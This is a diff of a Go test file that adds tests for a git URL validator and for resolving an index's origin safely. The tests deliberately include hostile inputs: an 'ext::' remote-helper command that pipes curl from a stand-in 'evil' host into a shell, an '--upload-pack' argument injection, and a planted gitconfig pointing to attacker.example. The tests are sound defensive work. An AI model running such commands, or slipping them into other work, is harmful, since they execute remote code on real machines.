@@ -119,6 +119,118 @@ func TestAnIndexIsAttachedUpdatedAndDetached(t *testing.T) {
 	}
 }
 
+// git's idea of a repository argument is wider than "somewhere to clone
+// from", and `<transport>::<argument>` is the part that matters:
+// git-remote-ext takes a command line. git refuses ext by default, so this
+// grammar closes no hole git leaves open — it refuses to depend on a default
+// that a `protocol.allow = always` line in a CI image turns off.
+//
+// The IPv6 cases are here because the first draft of this refused them: it
+// searched for "::" anywhere in the string, which is also how an IPv6 literal
+// is written, so every bracketed URL was reported as a remote helper.
+func TestTheGitURLGrammarAdmitsRepositoriesAndNothingElse(t *testing.T) {
+	for _, c := range []struct {
+		raw  string
+		kind gitURLKind
+		ok   bool
+	}{
+		{"https://github.com/x/i.git", gitRemoteURL, true},
+		{"ssh://git@github.com:22/x/i.git", gitRemoteURL, true},
+		{"git@github.com:x/i.git", gitRemoteURL, true},
+		{"https://[::1]/x/i.git", gitRemoteURL, true},
+		{"ssh://git@[2001:db8::1]/x/i.git", gitRemoteURL, true},
+		{"file:///srv/index", gitLocalURL, true},
+		{"/srv/index", gitLocalURL, true},
+		{"./index", gitLocalURL, true},
+		{"index", gitLocalURL, true},
+
+		{"ext::sh -c 'curl https://evil/x|sh'", 0, false},
+		{"ext::whatever", 0, false},
+		{"http://example.com/i.git", 0, false},
+		{"git://example.com/i.git", 0, false},
+		{"ftp://example.com/i.git", 0, false},
+		{"--upload-pack=evil", 0, false},
+		{"", 0, false},
+		{"file://relative/path", 0, false},
+		{"https:///nohost", 0, false},
+	} {
+		t.Run(c.raw, func(t *testing.T) {
+			kind, verr := classifyGitURL(c.raw)
+			if c.ok {
+				if verr != nil {
+					t.Fatalf("refused a repository: %v", verr)
+				}
+				if kind != c.kind {
+					t.Errorf("kind = %v, want %v — the file:// gate keys off this", kind, c.kind)
+				}
+				return
+			}
+			if verr == nil {
+				t.Fatalf("admitted %q", c.raw)
+			}
+			if verr.Code != "plugin.index.url" {
+				t.Errorf("code = %s, want plugin.index.url", verr.Code)
+			}
+		})
+	}
+}
+
+// An index attached from a path may name file:// artifacts and one cloned
+// from a network URL may not, so "where did this come from" has to be a fact
+// rta cannot be talked out of.
+//
+// --local is the whole test. `git config --get` reads system and global
+// config before the repository's own, so without it a ~/.gitconfig holding a
+// [remote "origin"] line answers for a directory that is not a repository at
+// all — two lines in a file the operator never looks at, and every index
+// claims whatever origin it likes.
+func TestAnIndexOriginCannotComeFromOutsideTheClone(t *testing.T) {
+	testData(t)
+	ctx := context.Background()
+
+	repo := gitFixture(t, map[string]string{"pg": goodManifest})
+	if verr := AddIndex(ctx, "lab", repo); verr != nil {
+		t.Fatal(verr)
+	}
+
+	// Planted after the attach, which is the situation being tested: the
+	// clone is a real one of a local path, and the question is whether
+	// reading its origin back can be influenced from outside it. (Setting
+	// this before the attach tests something else entirely — git clone
+	// itself honours a global remote.origin.url and reaches for it instead
+	// of the path it was given.)
+	global := filepath.Join(t.TempDir(), "gitconfig")
+	if err := os.WriteFile(global, []byte("[remote \"origin\"]\n\turl = https://attacker.example/planted\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	t.Setenv("GIT_CONFIG_GLOBAL", global)
+
+	ix, ok := IndexByName("lab")
+	if !ok {
+		t.Fatal("the index did not attach")
+	}
+	origin, verr := IndexOrigin(ctx, ix)
+	if verr != nil {
+		t.Fatalf("IndexOrigin: %v", verr)
+	}
+	if strings.Contains(origin, "attacker.example") {
+		t.Fatalf("the origin came from the global gitconfig, not the clone: %q", origin)
+	}
+	if kind, verr := classifyGitURL(origin); verr != nil || kind != gitLocalURL {
+		t.Errorf("a clone of a local path did not read back as local: origin=%q kind=%v verr=%v",
+			origin, kind, verr)
+	}
+
+	// A directory nobody attached states no origin, and that refuses rather
+	// than defaulting to "local" — which would be the permissive answer.
+	bare := Index{Name: "bare", Dir: t.TempDir()}
+	if _, verr := IndexOrigin(ctx, bare); verr == nil {
+		t.Fatal("a directory that is not a clone reported an origin")
+	} else if verr.Code != "plugin.index.origin" {
+		t.Errorf("code = %s, want plugin.index.origin", verr.Code)
+	}
+}
+
 func TestAttachRefusals(t *testing.T) {
 	testData(t)
 	ctx := context.Background()
